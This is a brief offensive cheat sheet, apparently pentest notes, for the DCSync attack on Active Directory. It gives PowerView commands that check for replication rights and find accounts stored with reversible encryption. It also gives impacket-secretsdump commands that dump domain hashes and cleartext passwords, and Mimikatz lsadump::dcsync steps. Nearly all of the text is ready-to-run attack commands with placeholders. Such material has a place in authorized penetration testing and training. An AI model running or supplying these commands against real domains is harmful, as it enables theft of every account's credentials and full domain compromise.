==Requires DS-Replication-Get-Changes-All extended right==
```
Get-DomainUser -Identity <USER>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
$sid= "<SID>"
Get-ObjectAcl "DC=<DOMAIN>,DC=<DOMAIN>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
impacket-secretsdump -outputfile <OUTPUT_HASHES> -just-dc <DOMAIN>/<USER>@<IP>
```
### Reversible Encryption
```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
impacket-secretsdump -outputfile <OUTPUT_HASHES> -just-dc <DOMAIN>/<USER>@<IP>
cat <OUTPUT_HASHES>.ntds.cleartext
```
### Mimikatz
```
runas /netonly /user:<DOMAIN>\<USER> powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER>
```